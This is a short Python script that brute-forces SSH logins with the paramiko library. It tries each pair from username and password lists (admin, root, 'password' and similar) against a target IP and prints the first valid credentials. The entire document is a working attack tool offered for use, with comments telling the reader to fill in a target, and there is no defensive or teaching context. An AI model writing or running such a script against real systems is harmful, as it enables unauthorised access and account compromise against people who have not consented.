
import paramiko
import socket

def ssh_brute_force(ip, port, username_list, password_list):
    for username in username_list:
        for password in password_list:
            try:
                print(f"Trying username: {username} with password: {password}")
                
                # Create SSH client
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                # Attempt to connect
                client.connect(ip, port=port, username=username, password=password, timeout=3)
                print(f"Success! Username: {username} and Password: {password} are valid.")
                client.close()
                return True

            except paramiko.AuthenticationException:
                print(f"Invalid credentials for {username}:{password}")
                continue
            except socket.error as e:
                print(f"Socket error: {e}")
                return False

    return False

ip = '192.168.1.1' # Replace with the target IP
port = 22
username_list = ['admin', 'root', 'user']  # Replace with your list of usernames
password_list = ['12345', 'password', 'root']  # Replace with your list of passwords

ssh_brute_force(ip, port, username_list, password_list)
